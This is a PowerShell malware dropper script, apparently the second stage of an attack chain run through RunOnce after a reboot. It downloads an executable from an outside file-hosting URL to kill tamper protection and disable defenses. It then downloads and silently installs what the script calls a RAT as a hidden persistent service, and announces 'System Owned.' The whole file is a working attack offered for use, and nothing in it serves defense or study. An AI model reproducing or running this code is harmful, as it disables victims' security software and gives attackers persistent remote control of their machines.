# Revolution Plan 2 - The Payload Chain
# Executed by RunOnce after reboot.

# === SPEED FIX: Disable Progress Bar (Increases download speed by 10x) ===
$ProgressPreference = 'SilentlyContinue'

Write-Host "Revolution Phase 2: Payload Delivery" -ForegroundColor Cyan

# ---------------------------------------------------------
# STEP 1: Tamper Protection Killer (Defense Evasion)
# ---------------------------------------------------------
# REPLACE THIS URL with your uploaded 'tamper_killer.exe' link
# (User: Paste your link here!)
$TamperUrl = "https://download1338.mediafire.com/p5ox0fbzw2agofsmmM4j36EXZVcq9BFjoCQvHdpLN1tS6ZQ_oRKKWaaehGyXhbVzf2h4GuuLFybxMVDFMiiqpNAg4nWy7G5s36jeQ-16tcNcb4B2tTGH5BMjqdJeuKkMYMxICSqMT81lSVbBZJXIIy66chG2B1BFg5eszCfmCuFj/pyr9u6630bu1urj/tamper_killer.exe" 
$TamperDest = "$env:TEMP\tamper_killer.exe"

Write-Host "[1/2] Downloading Defense Neutralizer..."
try {
        Invoke-WebRequest -Uri $TamperUrl -OutFile $TamperDest -UseBasicParsing
        Unblock-File -Path $TamperDest -ErrorAction SilentlyContinue
        
        if (Test-Path $TamperDest) {
            Write-Host "    -> Launching Neutralizer (Background)..." -ForegroundColor Yellow
            # REMOVED -Wait: We do not wait for it, because it might run forever or take time.
            Start-Process -FilePath $TamperDest
            Write-Host "    -> Defenses Down (Process Started)." -ForegroundColor Green
        }
} catch {
    Write-Host "    [!] Tamper Download Failed: $($_.Exception.Message)" -ForegroundColor Red
}

# ---------------------------------------------------------
# STEP 2: MyDesk Persistent Agent (The RAT)
# ---------------------------------------------------------
# REPLACE THIS URL with your uploaded 'MyDeskSetup.exe' link
$SetupUrl = "https://download941.mediafire.com/z514so34f92gvj_K6BuaBZsCs5hYWmLU2J93JYEuJ7YH1Fl7skCq4YFhj6tNd9bX6KeEkpAMU3PGA2hsI6JB6TgoMZcdd6gL51gY_JmiUoGTBY0nZ_1b7Kc8vpkas2LmZgQurVYt__kosnYPhXiKsXQhIcn7KrnTmsxZgw3IXLjE/20v5dhm5fp1z6ir/MyDeskSetup.exe" 
$SetupDest = "$env:TEMP\MyDeskSetup.exe"

Write-Host "[2/2] Downloading Persistent Agent..."
try {
        Invoke-WebRequest -Uri $SetupUrl -OutFile $SetupDest -UseBasicParsing
        Unblock-File -Path $SetupDest -ErrorAction SilentlyContinue
        
        if (Test-Path $SetupDest) {
            Write-Host "    -> Installing Hidden Service..." -ForegroundColor Yellow
            # Service Installer exits quickly, so -Wait is fine here.
            Start-Process -FilePath $SetupDest -Wait
            Write-Host "    -> Agent Installed & Signaling." -ForegroundColor Green
        }
} catch {
    Write-Host "    [!] Agent Download Failed: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "Revolution Complete. System Owned." -ForegroundColor Magenta
Start-Sleep -Seconds 5